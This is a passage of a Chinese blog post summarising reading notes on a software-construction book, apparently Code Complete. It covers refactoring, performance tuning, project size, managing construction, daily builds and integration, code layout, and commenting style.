title="重构的理由"></a>重构的理由</h3><ul><li>代码重复</li><li>冗长的子程序</li><li>循环过长或嵌套过深。循环内部复杂的子程序通常具备转换为子程序的潜质。</li><li>内聚性太差的类</li><li>类的接口未能提供层次一致的抽象</li><li>拥有太多参数的参数列表。如果一个子程序被分解的很好，那么它的子程序应当小巧、定义精确，且不需要庞大的参数列表。</li><li>变化导致对多个类的相同修改</li><li>对继承体系同样的修改</li><li>case 语句需要做相同的修改</li><li>同时使用的相关数据并未以类的方式进行组织</li><li>成员函数使用其他类的特征比使用自身类的特征还要多</li><li>过多使用基本数据类型。基本数据类型可用于表示真实世界中实体的任意数量。如果程序中使用了整型这样的数据类型表示某种常见的实体，如货币，请考虑创建一个简单的 money 类，这样编译器就可以对 money 变量执行类型检查，你也可以对赋给 money 的值添加安全检查等功能。</li><li>某个类无所事事</li><li>一些列传递流浪数据（数据只是被传来传去而不做任何数据）的子程序</li><li>如果看到某个类中的绝大部分代码只是去调用其他类中的成员函数，请考虑是否应该把这样的中间人去掉，转而去直接调用其他的类</li><li><strong>某个类同其他类关系过于亲密</strong>。类的作用是使程序具备更强的可管理行，并最大限度地减少更改代码对周围的连带影响。</li><li>子程序命名不恰当</li><li>数据成员被设置为公用</li><li>某个派生类仅使用了基类的很少一部分成员函数。更完善的封装应该是，把派生类相对于基类的关系从“is-a”转变为“has-a”。即把基类转换为原来的派生类的数据成员，然后仅仅为原来的派生类提供所需要的成员函数。</li><li>注释被用于解释难懂的代码。“<strong>不要为拙劣的代码编写文档——应当重写代码。</strong>”</li><li>使用了全局变量</li><li>程序中的一些代码似乎是在将来的某个时候才会用到。<strong>“超前设计”的代码是画蛇添足</strong>，增加了程序的复杂性，带来了额外的测试、修补缺陷等工作量。对未来需求有所准备的办法并不是去编写空中楼阁式的代码，而是尽可能满足当前需求的代码清晰直白地表现出来，使未来的程序员理解这些代码到底完成了什么功能，没有完成什么功能，从而根据他们的需要进行修改。</li></ul><p>数据级的重构</p><ul><li>用具名常量替代神秘数值</li><li>使变量的名字更为清晰且传递更多信息</li><li>把一个中间变量换成给它赋值的那个表达式本身</li><li>用函数来替代表达式</li><li>引入中间变量</li><li>替换i、j、k等同名多用途变量名</li><li>在局部用途中使用局部变量而不是参数</li><li>将基础数据类型转换为类。如果一个基础数据类型需要额外的功能或额外的数据，那么就该把数据转换为一个对象，然后再添加你所需要的类行为。</li><li><strong>将一组类型码转换为类或枚举类型</strong>。如<code>const int SCREEN = 0;</code>，与其定义这些单独的常量，不如定义一个类，这样你就可以享受严格类型检查所带来的好处。</li><li>将一组类型码转换为一个基类及其相应派生类。如果与不同类型相关联的不同代码片段有着不一样的功能，请考虑为该类型创建一个基类，然后针对每个类型码创建派生类。如对 OutputType 基类，就可以创建 Screen、Printer 和 File 这样的派生类。</li><li>把数组转换为对象。如果正在使用一个数组，其中的不同元素具有不同的类型，那么就应该用一个对象来替代它。将数组中的各个元素转化为该类的各个成员。</li><li>把数据集封装起来。如果一个类返回一个数据集，到处散布的多个数据集实例将会带来同步问题。请让你的类返回一个只读数据集，并且提供相应的为数据集添加和删除元素的子程序。</li><li>用数据类来代替传统记录。建立一个包含记录成员的类。这样你可以集中完成对记录的错误检查、持久化和其他与该记录相关的操作。</li></ul><p>语句级的重构</p><ul><li>分解布尔表达式。通过引入命名准确的中间变量来简化复杂的布尔表达式，通过变量名更好地说明表达式的含义。</li><li>将复杂布尔表达式转换成命名准确的布尔函数</li><li>合并条件语句不同部分中的重复代码片段</li><li>使用 break 或 retum 而不是循环控制变量</li><li>在嵌套的 if-then-else 语句中一旦知道答案就立即返回，而不是去赋一个返回值。一旦知道返回值就迅速退出子程序，这样的代码最容易分析，也不容易出错。如果设置一个返回值，再通过啰嗦的逻辑判断退出循环，你的代码就会难于理解。</li><li>用多态来替代条件语句(尤其是重复的case语句)。结构化程序里很多的case语句中的逻辑都可以被放到继承关系中，通过多态函数调用实现。</li><li>创建和使用null对象而不是去检测空值。</li></ul><p>子程序级重构</p><ul><li>提取子程序或者方法</li><li>如果子程序的程序体很简单，且含义不言自明，那么就在使用的时候直接使用这些代码。</li><li>将冗长的子程序转换为类。</li><li>用简单算法替代复杂算法。</li><li>如果子程序需要从调用方获得更多的信息，可以增加它的参数从而为其提供信息。</li><li>删除冗余参数</li><li>将查询操作从修改操作中独立出来。查询操作不应改变对象的状态。</li><li>合并相似的子程序，通过参数区分它们的功能</li><li><strong>将行为取决于参数的子程序拆分开来</strong>。如果一个子程序根据输入参数的值执行了不同的代码，请考虑将它拆分成可几个以被单独调用的、无须传递特定参数的子程序。</li><li>传递整个对象而非特定成员。如果发现有同一对象的多个值被传递给了一个子程序，考虑是否可修改其接口使之接收整个对象。</li><li>传递特定成员而非整个对象。如果发现创建对象的唯一理由只是你需要将它传入某个子程序，那么就考虑一下 是否可以修改这个子程序，使之接收特定数据成员而非整个对象。</li><li>包装向下转型的操作。通常当子程序返回一个对象时，应当返回其已知的最精确的对象类型。这尤其适用于返回迭代器、群集、群集元素等的情况。</li></ul><p>类接口的重构</p><ul><li>将成员函数放到另一个类中</li><li>明确类的职责，拆分承担多个职责的单类</li><li>删除冗余的类</li><li>去除委托关系与中间人。A ==&gt; B ==&gt; C，三者的调用关系链是否必须？</li><li>用委托代替继承。如果某类需要用到另一个类，但又打算获取对该类接口更多的控制权，那么可以让基类成为原派生类的一个成员，并公开它的一组成员函数，以完成一种内聚的抽象。（？？？）</li><li>用继承代替委托。如果某个类公开了委托类（成员类）所有的成员函数，那么该类应该从委托类继承而来，而不是使用该类。（？？？）</li><li>引入外部的成员函数。当你调用了一个无法修改的类的额外成员函数时，就可以在调用类中创建新的成员函数方式来提供此功能</li><li>引入扩展类</li><li>对暴露在外的成员变量进行封装</li><li>对于不能修改的类成员，删除相关的 set() 成员函数</li><li>隐藏那些不会在类之外被用到的成员函数</li><li>封装不适用的成员函数</li><li>合并那些实现非常类似的基类和派生类</li></ul><h3 id="安全的重构"><a href="#安全的重构" class="headerlink" title="安全的重构"></a>安全的重构</h3><p>重构是一种改善代码质量的强有力的技术,如果使用不当，重构给你带来的麻烦会比它所带来的好处还要多。</p><ul><li>保存初始代码</li><li>重构的步伐请小一些</li><li>同一时间只做一项重构</li><li>把要做的事情列出来</li><li>如果在一次重构中发现需要另一次的重构，你最好先将未来需要重构的地方列出来</li><li>多使用检查点</li><li>利用编译器的警告信息</li><li>重新测试</li><li>增加测试用例</li><li>检查对代码的修改。<strong>研究表明，相对于大规模修改，小的改动更容易出错</strong>。原因很简单：程序员们对于很小的修改常常不以为然。他们不会用纸和笔来推敲程序，也不会让其他人来检查代码。有时甚至根本不会运行这些代码来验证修改工作的正确性。</li><li>根据重构风险级别来调整重构方法。对于那些有一定风险的重构，<strong>谨慎才能避免出错</strong>。务必一次只处理一项重构。除了完成通常要做的编译检查和单元测试之外，还应该让其他人来检查你的重构工作，或是针对重构采用结对编程。 </li></ul><h3 id="不宜重构的情况"><a href="#不宜重构的情况" class="headerlink" title="不宜重构的情况"></a>不宜重构的情况</h3><ul><li><strong>不要把重构当做先写后改的代名词</strong>。重构的含义是在不影响程序行为的前提下改进可运行的代码。那些修补破烂代码的程序员们不是在重构，而是在拼凑代码。</li><li>避免重构代替重写。如果发现自己处于大规模的重构之中，就应该问问自己是否应该把这部分代码推倒重来，重新设计，重新开发。</li></ul><h3 id="重构策略"><a href="#重构策略" class="headerlink" title="重构策略"></a>重构策略</h3><p>对任何特定程序都能带来好处的重构方法本应是无穷无尽的。和其他的编程行为一样，重构同样受制于收益递减定律，同样也符合二八法则。</p><ul><li>在增加子程序时进行重构。检查相关的子程序是否都被合理地组织起来了。</li><li>在添加类的时候进行重构。</li><li>在修补缺陷的时候进行重构</li><li>关注易于出错的模块。烫手的山芋彻底解决才是有效的重构策略。</li><li>关注高度复杂的模块</li><li><strong>在维护代码时，确保代码在离开你的时候比来之前更健康</strong></li><li>定义清楚干净代码和拙劣代码之间的边界，然后尝试把代码移过这条边界</li></ul><p>Key Points</p><ul><li>修改是程序一生都要面对的事情，不仅包括最初的开发阶段，还包括首次发布之后。</li><li>在修改中软件的质量要么改进，要么恶化。软件演化的首要法则就是代码演化应当提升程序的内在质量。</li><li>重构成功之关键在于程序员应学会关注那些标志着代码需要重构的众多的警告或“代码臭味”。</li><li><strong>开发阶段的重构是提升程序质量的最佳时机</strong>，因为你可以立刻让刚刚产生的改变梦想变成现实。请珍惜这些开发阶段的天赐良机！</li></ul><h2 id="第25章-代码-性能-调整策略"><a href="#第25章-代码-性能-调整策略" class="headerlink" title="第25章 代码(性能)调整策略"></a>第25章 代码(性能)调整策略</h2><p>在极少情况下，程序员能正确确定出程序的瓶颈。但他们可能对这一部分代码痛下重手而顾此失彼，让另一部分代码成为制约性能的关键因素。这样，最终的结果是性能的下降。而如果优化放在整个系统完成之后，那么程序员就可以明确各个问题域以及各自的相对重要性,从而有效地对全部优化所用时间进行分配。（<strong>性能调整放在系统完成后处理</strong>）</p><p>在最初的开发阶段中，程序员老是把目光集中在优化上面会干扰自己对其他程序目标的理解和判断,让自己沉浸在那些最终并没有为用户提供多大价值的算法分析和晦涩的讨论中，把对正确性、信息隐藏、可读性等的考虑放到了第二位。实际上，在重视这些之后会更容易实施性能优化。如果首先考虑前者，那么后期优化工作通常只会影响到不足5%的程序代码。你是愿意回过头去处理5%代码的效能，还是去改善100%的程序的可读性?</p><p>过早的性能优化会对软件的整体质量产生严重威胁，受到影响的甚至包括软件的性能。</p><p><strong>4%的代码造成了50%甚至更多的性能瓶颈。</strong></p><p>常见的效率低下之源：</p><ul><li>I/O。尽可能在内存中操作数据，避免磁盘与网络 I/O 操作。</li><li>内存分页。引发操作系统交换内存页面的运算会比在内存同一页中进行的运算慢很多。</li><li>系统调用。调用系统子程序的代价常常是十分可观的。这些调用通常会涉及系统的上下文切换——保存程序状态、恢复内核状态，以及相反的操作。</li><li>解释型语言</li><li>错误。这些错误可能是没有去掉调试代码、忘记释放内存、数据表库设计失误、轮询并不存在的设备直到超时等</li></ul><p>尽管几乎不可能从一种方法中获得十倍的性能改进，但你可以将多种方法有效地结合起来，效果经常是惊人的。</p><h3 id="程序整体性能提升的方法"><a href="#程序整体性能提升的方法" class="headerlink" title="程序整体性能提升的方法"></a>程序整体性能提升的方法</h3><ul><li>修改需求</li><li>修改程序设计</li><li>修改类的设计</li><li>减少程序与操作系统的交互</li><li>避免冗余 I/O 操作</li><li>使用编译型语言替换解释型语言</li><li>使用更好的编译器优化</li><li>使用不同硬件提升性能</li><li>是否将代码调整看做性能优化的最后一招？</li></ul><p>Key Points</p><ul><li>性能只是软件整体质量的一个方面，通常不是最重要的。相对于代码本身的效率而言，程序的架构、细节设计以及数据结构和算法选择对程序的运行速度和资源占用的影响通常会更大。</li><li>定量测量是实现性能最优化的关键。定量测量需要找出能真正决定程序性能的部分，在修改之后,应当通过重复测量来明确修改是提高还是降低了软件的性能。</li><li><strong>绝大多数的程序都有那么一小部分代码耗费了绝大部分的运行时间</strong>。如果没有测量，你不会知道是哪一部分代码。</li><li>代码调整需要反复尝试，这样才能获得理想的性能提高。</li><li>为性能优化工作做好准备的最佳方式就是在最初阶段编写清晰的代码,从而使代码在后续工作中易于理解和修改。</li></ul><h2 id="第26章-代码调整技术"><a href="#第26章-代码调整技术" class="headerlink" title="第26章 代码调整技术"></a>第26章 代码调整技术</h2><p>优化循环的几个方面</p><ul><li><strong>编写高效循环的关键在于尽可能减少循环内部所做的工作</strong>。如果你可以在循环外面计算某语句或某部分语句，而在循环内部只是使用计算结果，那么就把它们放到外面。这是一种很好的编程实践，在很多情况下还可以改善程序的可读性。</li><li>把循环次数最多的循环放在最内层</li><li>用更高效的方式运算，如用移位代替乘除，将金额以分为单位进行整型运算，而非浮点数</li><li>数组维度尽可能浅</li><li>利用代数的恒等替换。如用<code>x&lt;y</code>判断替换<code>sqrt(x)&lt;sqrt(y)</code></li><li>尽可能将运行前就可确定的值确定下来，以加快运算速度。如一天的秒数固定为 86400s，无需每次运行时计算。</li></ul><h2 id="第27章-程序规模对构建的影响"><a href="#第27章-程序规模对构建的影响" class="headerlink" title="第27章 程序规模对构建的影响"></a>第27章 程序规模对构建的影响</h2><p>如果你习惯于开发小项目，那么你的第一个中大型项目有可能严重失控，它不会像你憧憬那样成功，而会变成一头无法控制的野兽。如果你已经习惯于开发大型项目，那么你所用的方法可能对小项目来说太正规了。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872w9izp2j314k0t2wjr.jpg" alt=""></p><p><strong>项目越大越容易出错</strong>。这包含成员间复杂的沟通、需求评估的准确性、架构设计的合理性、组织结构、生产效率以及错误率等，你需要比小型项目花费更多的精力才能获得与小型项目一样的错误率。</p><p>在软件开发中，人越多，效率就越低！合适的人，合适的配置才能提高效率。高效的大型项目是建立一个分工明确、合作有序的「外科手术式的队伍」。外科手术中，有主刀医生、第一助手、麻醉医生、护士等，软件项目也应该有首席程序员、其他的程序员、管理者，文档编辑人员等。这样，既能获得由少数头脑产生的产品完整性，又能得到多位协助人员的总体生产率，还彻底地减少了沟通的工作量。</p><blockquote><p>关于大型项目管理请参看《人月神话》<br>一点想法：如何评估编程管理是否合理？查看程序员的每天高质量的代码行数以及 bug 率。</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872wpk2uhj30yc0h0act.jpg" alt=""></p><h2 id="第28章-管理构建"><a href="#第28章-管理构建" class="headerlink" title="第28章 管理构建"></a>第28章 管理构建</h2><p><strong>由一位受人尊敬的架构师来制定标准</strong>。有时项目的架构师只是一名在项目中待的时间非常长的资深闲杂人士，他已经不再接触与产品编码有关的事务了。由这种“架构师”定义出来的标准是会受到程序员怨恨的，因为他根本不了解程序员正在做的工作。</p><h3 id="鼓励良好的编码实践技术"><a href="#鼓励良好的编码实践技术" class="headerlink" title="鼓励良好的编码实践技术"></a>鼓励良好的编码实践技术</h3><ul><li>给项目的每一部分分派两个人。如果每行代码都由两个人共同完成，那么你可以保证至少有两个人认为这段代码是能工作的，而且是可读的。两人组队的办法有结对编程、导师带学生、复审等。</li><li>逐行复查代码。除了能为“原程序员离开项目”这一情况提供一层安全保障外，复查还能改善代码的质量，因为程序员知道会有其他人阅读他的代码。</li><li>要求代码签名。在认定代码完成之前，高级技术人员必须在代码清单上签字。</li><li>安排一些好的代码示例供人参考。你可以用一份清楚的样例说明自己的质量目标。类似的，编码标准手册里也可以主要包含一份“最佳代码清单”。这种手册更新起来要比文档容易的多，而且它能很容易地将编码风格中的细微之处表达清楚。</li><li>强调代码是公有财产。这会让开发者有意识的注意自己的代码质量。</li><li>奖励好代码。在开发你的激励机制时，请将以下方面考虑进去：<ul><li>所给予的奖励应该是程序员想要的</li><li><strong>只有非常出色的代码才应得到奖励</strong>。至于这位程序员是否有良好的合作态度或者上班是否准时都不重要，<strong>如果你的奖励不符合技术标准，你将失去信誉</strong>。如果你的技术水平还没有高到足以判断代码的优劣，那么就不要判断！这时候千万不要奖励，或者让你的团队来选择该奖励谁。</li><li>将奖励设置为每月一次，这样<strong>开发者的努力回报不会因为太久而放弃</strong>，促使大家都在努力提升自己。</li></ul></li><li>一份简单的标准。如果你正在管理一个编程项目，并且你具有一定的编程背景，那么有一种方法可以简单有效地获得好的工作成果——你只需要求“<strong>我必须能阅读并理解这个项目里的所有代码</strong>”。管理者不是技术专家这一事实反而有助于阻止产生“聪明的”或者难以理解的代码。</li></ul><blockquote><p>小思考：为什么优秀的开源程序的质量很高？<br>贡献者在开源前会优化代码的可读性，测试自己的代码质量，开源后会有其他开发者一同审视、运行代码、反馈问题，从而得到正向循环的优化。</p></blockquote><p>控制设计变更的指导原则</p><ul><li>遵循某种系统化的变更控制手续</li><li>成组地处理变更请求。当你在开发中有变更想法时，请将它记录下来，集中注意在开发工作中，在开发结束后统一处理这些变更。这避免你的开发工作被打断、不必要的变更，以及错过一些好的变更。</li><li>评估每项变更的成本。变更控制的实质是确定什么最重要，所以要确定变更的收益与成本是划算的。</li><li>提防大量的变更请求。尽管变更在一定程度上是不可避免的，<strong>变更请求的数量太大仍然是一个很关键的警报信号，它表明需求、架构或者上层设计做得不够好，从而无法有效地支持构建活动</strong>。对需求或者架构进行返工也许看上去代价昂贵，但是与“多次构建软件”或者“扔掉不需要的功能的代码”的高昂代价相比,还是值得考虑的。</li><li>成立变更控制委员会或者类似机构</li><li>警惕官僚主义，但也不要因为害怕官僚主义而排斥有效的变更控制</li></ul><h3 id="软件评估的方法"><a href="#软件评估的方法" class="headerlink" title="软件评估的方法"></a>软件评估的方法</h3><ul><li>建立目标。评估中是否包含会议、休假、节假日、培训以及其他非项目相关的活动？什么样的评估准确度才能达到你的目标？乐观评估与悲观评估会产生截然不同的结果吗？</li><li>为评估留出时间，并作出计划</li><li>清楚地说明软件需求。当要做的事情还没有确定时，谁也无法做出准确的评估。</li><li>在底层细节层面进行评估</li><li>使用若干不同的评估方法，并且比较其结果。小孩们很早就知道，如果分别向父母索要冰激凌，比仅向父亲或母亲索要的成功率要高，而且可能要到两份。</li><li>定期做重新评估。项目越接近完成，评估的准确度应该越高。要不时地将评估结果和实际结果进行比价衡量，用这一衡量结果来改善你对项目剩余部分的评估。</li></ul><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872uxkjruj31680u00yo.jpg" alt=""></p><p>一位妇女怀胎十月诞下一子，并不意味着十位妇女能只用一个月时间生下一个孩子。因此，对于某些无法拆分的任务，在落后时添加人手只会让项目延期更久，因为新手需要先熟悉项目才能产出，而熟悉项目又占用了已受训的开发者时间。仅仅增加人员还会导致交流的复杂度和数据也增加。此时，如果可以延长开发时间当然是最好的，如果不能，那就保留必须的功能，或者原有功能的简化版本。</p><h3 id="工作环境与生产效率的关系"><a href="#工作环境与生产效率的关系" class="headerlink" title="工作环境与生产效率的关系"></a>工作环境与生产效率的关系</h3><p>生产力与工作环境间有着很强的关联性。如果开发者旁边坐着电话销售或者售后，他们是无论如何都无法产出高质量代码的。</p><blockquote><p>管理者应该关注提升员工的有效生产力。如果能通过一次投入的改善环境来持续提升生产力，何乐而不为呢？比如针对开发者设置格子间办公，自由的工作时间，每周允许员工两天远程办公等。只要员工能够按时高质量完成工作，我觉得工作形式不必拘泥。</p></blockquote><blockquote><p>关于远程办公与办公室办公的一些讨论：远程办公有优势有劣势，对于独立性强的工作、或者个人能力超强的人，这比较合适；但是对于协同非常频繁、或者需要大量组织管理工作的人来说，这只会降低生产力。如果每周允许几天的远程办公，既可以节省上下班时间，又可以提升员工的幸福感。如果完全远程办公，则会导致团队协作效率低下，团队氛围差等问题。</p></blockquote><blockquote><p>关于开放式办公与格子间办公的一些讨论：开放式办公导致噪音污染与视觉混乱，无法集中注意力、影响独立思考，以及剥夺隐私等问题。真正便于员工创造价值的设计在于空间的“可选择性”，即赋予员工更多的自主选择权。员工可以在不同类型的功能区内选择适合自己工作方式的位置，需要静下心来工作时可以独辟一个区域办公，需要沟通合作时围坐在一起协同工作。</p></blockquote><h3 id="管理你的管理者"><a href="#管理你的管理者" class="headerlink" title="管理你的管理者"></a>管理你的管理者</h3><p>在软件开发中，非技术出身的管理者随处可见，具有技术经验但却落后于这个时代十年以上的管理者也比比皆是。技术出色并且其技术与时俱进的管理者实属凤毛麟角。如果你正在为一位这样的管理者工作，那么就尽可能地保住你的工作吧。这可是非常难得的待遇。</p><p>如果你的管理者是很典型的那种，那么你将不得不肩负一项不值得羡慕的责任——管理你的管理者。“管理你的管理者”意味着，你需要告诉他应该这样做而不应该那样做。其要诀在于，你要表现得使你的管理者认为他仍然在管理你。<br>下面就是一些应对管理者的方法:</p><ul><li>把你希望做什么的念头先藏起来，等着你的管理者组织一场有关你的想法的头脑风暴集体讨论。</li><li>把做事情的正确方法传授给你的管理者。这是一项需要持之以恒的工作，因为管理人员经常会被提升、调迁或者解聘。</li><li>关注你的管理者的兴趣，按照他的真正意图去做，而不要用些不必要的实现细节来分散其注意力。(请把它设想成是对你工作的一种“封装”。)</li><li>拒绝按照你的管理者所说的去做，坚持用正确的方法做自己的事。</li><li>换工作。<br>最佳的长远的解决方案是教育你的管理者。这样做通常很难，但是你可以通过阅读卡内基的《人性的弱点》一书来做好必要的准备。</li></ul><h2 id="第29章-集成"><a href="#第29章-集成" class="headerlink" title="第29章 集成"></a>第29章 集成</h2><h3 id="从集成中，我们可以获得："><a href="#从集成中，我们可以获得：" class="headerlink" title="从集成中，我们可以获得："></a>从集成中，我们可以获得：</h3><ul><li>更容易诊断缺陷</li><li>缺陷更少</li><li>脚手架更少</li><li>花费更少的时间获得第一个能工作的产品</li><li>更短的整体开发进度表</li><li>更好的顾客关系</li><li>增强士气</li><li>增加项目完成的机会</li><li>更可靠地估计进度表</li><li>更准确的现状报告</li><li>改善代码质量</li><li>较少的文档</li></ul><h3 id="增量集成的益处"><a href="#增量集成的益处" class="headerlink" title="增量集成的益处"></a>增量集成的益处</h3><ul><li>易于定位错误</li><li>及早在项目里取得系统级的成果</li><li>改善对进度的监控</li><li>改善客户关系。客户喜欢看到产品在一点点的前进</li><li>更加充分地测试系统中的各个单元</li><li>能在更短的开发进度计划内构造出整个系统</li></ul><h3 id="每日构建与冒烟测试"><a href="#每日构建与冒烟测试" class="headerlink" title="每日构建与冒烟测试"></a>每日构建与冒烟测试</h3><ul><li>项目需要每日构建。可以将每日构建视为项目的脉搏。</li><li>检查失败的构建</li><li>每天进行冒烟测试。冒烟测试应该从头到尾演练整个系统。它不必做到毫无遗漏，但是应该能够暴露主要问题。冒烟测试应该足够彻底：如果这一构建通过了测试，那么就能假定它已经足够稳定，可以接受更加彻底的测试了。</li><li>让冒烟测试与时俱进。随着系统的开发，冒烟测试变得更加彻底。</li><li>将每日构建与冒烟测试自动化</li><li>成立构建小组</li><li>仅当有意义时，才将修订加入构建中</li><li>但别等太久才将修订加入进来。如果某个开发人员接连两三天都不checkin他做的改动，那么这名开发人员所做的工作就是有风险的。频繁的集成有时迫使你将单一功能的构建分为若干阶段进行。这一额外开销是可接受的，是为“减小集成的风险、改善项目状况的能见度、改善可测试性，以及频繁集成的其他益处”而付出的代价。</li><li>要求开发人员在把他的代码添加到系统之前，进行冒烟测试</li><li>为即将添加到构建的代码准备一块暂存区。“每日构建过程的成功”部分取决于“知晓哪些构建是好的，哪些是坏的”。在测试自己的代码时，开发人员需要依赖“好的系统”。大多数团队解决这个问题的办法是，为开发人员认为“已准备好添加到构建中”的代码准备一块暂存区。新的代码进入暂存区，构建出新的构建，如果新的构建是可接受的，那么将新的代码合并到主源码中。在小型和中型项目中，版本控制系统可提供这一功能。开发人员将新的代码check in到版本控制系统中。对于那些想要使用已知是好的构建的开发人员，他们只需在checkout文件时设置一个日期选项，让版本控制系统根据所设日期取回上次的好的构建。</li><li>惩罚破坏构建的人</li><li>在早上发布构建。这样可以在工作时间处理构建中发现的问题，避免加班时相关人员不在，或者匆忙解决问题。</li><li>即使有压力,也要进行每日构建和冒烟测试。当进度压力变大时，维护每日构建所需的工作看起来就像是奢侈的额外开销了。其实相反的观点才是对的。每日构建强调了纪律，并让处于高压锅里的项目不出轨。代码仍然会有变混乱的倾向，不过构建过程每天都在把这种倾向拉回来。</li></ul><p>项目越大，增量集成越重要。</p><h2 id="第30章-开发工具"><a href="#第30章-开发工具" class="headerlink" title="第30章 开发工具"></a>第30章 开发工具</h2><p>编程未来会被 AI 替代吗？<br>答案是不会的。因为编程从根本上说就是困难的——即便有好的工具支援。 无论能用到哪些工具，程序员都必须与凌乱的真实世界较力；我们须得严密地思考前后次序、依赖关系、异常情况；而且我们还要与无法说清楚自己想法的最终用户交往。我们始终要应对连接到其他软件或硬件的定义不清的接口，还要解决规章制度、业务规则以及其他复杂性之源，这些复杂性来自计算机编程之外的世界。</p><h2 id="第31章-布局与风格"><a href="#第31章-布局与风格" class="headerlink" title="第31章 布局与风格"></a>第31章 布局与风格</h2><p>实际上，着重逻辑表现通常并不会做出难看的代码——除非代码的逻辑原本就很丑陋。</p><p>编程工作量的一小部分是写让机器读的程序，大部分工作是写能让他人看懂的程序。</p><p>你无法想象会有这样一本书：其中没有空格隔开单词，不分段落，也没有章节之分。这样的书或许从头至尾还是可以读的，但几乎不可能翻阅去找到某个关键句，或者定位某个重要的段落。更致命的大概是，书的这种布局不能对读者展示作者打算如何组织信息，而作者的组织方法正是理解有关主题逻辑结构的最重要线索。<br>将书分成一些章节、段落以及句子，就向读者展现出了作者组织主题的思路。如果这一组织不够明确，读者就必须自己去摸索，这将极大地增加读者的负担，或许他们自始至终都无法搞清有关主题的组织方式。<br>程序里包含的信息密度超过多数书籍里的信息密度。你也许一两分钟就能读完并理解书的一页内容，大部分程序员却不能以类似的速度看懂未经修饰的程序代码清单。程序应该比书提供更多的组织线索，而不是相反。</p><h2 id="第32章-自说明代码"><a href="#第32章-自说明代码" class="headerlink" title="第32章 自说明代码"></a>第32章 自说明代码</h2><p>对于精心编写的代码而言，注释不过是美丽衣裳外的小饰物而已。</p><p>类</p><ul><li>你的类接口体现出某种一致的抽象吗?</li><li>你的类名有意义吗，能表明其中心意图吗?</li><li>你的类接口对于如何使用该类显而易见吗?</li><li>你的类接口能抽象到不需考虑其实现过程吗?能把类看成是黑盒吗?</li></ul><p>子程序</p><ul><li>你的每个子程序名都能准确地指示该子程序确切干些什么吗?</li><li>你的各子程序的任务明确吗?</li><li>若各子程序中自成一体后更有用，你都将其各自独立出来了吗?</li><li>每个子程序的接口都清晰明了吗?</li></ul><p>数据名</p><ul><li>类型名描述有助于说明数据声明吗?</li><li>你的变量名有意义吗?</li><li>变量只用在其名字所代表意义的场合吗?</li><li>你的循环变量名能给出更多信息，而不是i、j、k之类的吗?</li><li>你用了名字有意义的枚举类型，而非临时拼凑的标识或者布尔变量吗?</li><li>用具名常量代替神秘数值或者字符串了吗?</li><li>你的命名规范能区分类型名、枚举类型、具名常量、局部变量、类变量以及全局变量吗?</li></ul><p>数据组织</p><ul><li>你根据编程清晰的需要，使用了额外变量来提高清晰度吗?</li><li>你对某变量的引用集中吗?</li><li>数据类型简化到了最低复杂度吗?</li><li>你是通过抽象访问子程序(抽象数据类型)来访问复杂数据吗?</li></ul><p>控制</p><ul><li>代码中的正常执行路径很清晰吗?</li><li>相关语句放在一起了吗?</li><li>相对独立的语句组打包为子程序了吗?</li><li>正常情况的处理位于if语句之后，而非在else子句中吗?</li><li>控制结构简单明了，以使复杂度最低吗?</li><li>每个循环完成且仅完成一个功能，是像定义良好的子程序那么做吗?</li><li>嵌套层次是最少吗?</li><li>逻辑表达式通过额外添加布尔变量、布尔函数和功能表简化了吗? </li></ul><p>布局</p><ul><li>程序的布局能表现出其逻辑结构吗?</li></ul><p>设计</p><ul><li>代码直截了当吗?是不是避免了自作聪明或新花样?</li><li>实现细节尽可能隐藏了吗?</li><li>程序是尽可能采用问题领域的术语，而非按照计算机科学或者编程语言的术语编写的吗?</li></ul><h3 id="注释的种类"><a href="#注释的种类" class="headerlink" title="注释的种类"></a>注释的种类</h3><ul><li>重复代码。重复性注释只是用不同文字把代码的工作又描述一次。它除了给读者增加阅读量外，没有提供更多信息。</li><li>解释代码。解释性注释通常用于解释复杂、敏感的代码块。在这些场合它们能派上用场，但通常正是因为代码含混不清，才体现出这类注释的价值。<strong>如果代码过于复杂而需要解释，最好是改进代码，而不是添加注释</strong>。使代码清晰后再用概述性注释或者意图性注释。</li><li>代码标记。用于提醒开发者某处的工作未做完或者某些注意事项，如TODO。代码标记最好有统一的风格，以便后期统一检索处理。</li><li>概述代码。将若干代码行的意思以一两句话说出来。这种注释比重复性注释强多了，因为读者读注释能比读代码更快。概述性注释对于要修改你代码的其他人来说尤其有用。</li><li>代码意图说明。目的性注释用来指明一段代码的意图，它指出要解决为问题，而非解决的方法，如<code>//get current employee information</code></li><li>传达代码无法表达的信息。某些信息不能通过代码来表达，但又必须包含在源代码中。这种注释包括版权声明、保密要求、版本号等杂项信息；与代码设计有关的注意事项；相关要求或者架构文件的索引；联机参考链接；优化注记：诸如Javadoc、Doxygen 等编辑器要求有的注释，等等。</li></ul><p>对于完工的代码，只允许有的三种注释类型：代码无法表述的信息、目的性注释和概述性注释。</p><h3 id="高效注释"><a href="#高效注释" class="headerlink" title="高效注释"></a>高效注释</h3><p>高效注释并不费时。注释太多并不比注释太少好，你很容易达到折中点。</p><p>注释占用太多时间通常归因于两点。一是，注释的风格可能耗时或枯燥乏味。如果这样，请另谋新的风格。需要庞大工作量的注释风格维护起来也会令人头痛。如果注释不便修改，人们就不愿意修改。于是乎，注释就会变得不准确，起到误导作用，反而还不如没有注释。二是因为说明程序干什么的话不好想出来，所以写注释太难。这通常是你没有真正理解程序的信号。“写注释”所占用的时间其实都用在了更好地理解程序上面，而不管你写不写注释，这些时间注定是得花的。</p><ul><li>不要使用<code>-</code>，<code>...</code>等符号来对齐使注释美观，在修改这样的注释时会平添大量工作。如果话大量时间增删横线只是为了对齐注释，你就不是在编程，而是在浪费时间。去找个高效点的风格吧。有个办法是采取固定长度的横线，不管注释内容有多长。这样的横线不必维护，还能用 IDE 的宏命令方便地添加。<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">//Variable</span>      Meaning</span><br><span class="line"><span class="string">//--------</span>      <span class="params">-------</span></span><br><span class="line"><span class="string">//xPos</span> <span class="string">........</span> XCorrdinate Position</span><br><span class="line"><span class="string">//yPos</span> <span class="string">........</span> YCorrdinate Position</span><br><span class="line"><span class="string">//psblScrMax</span> <span class="string">..</span> Possible Score 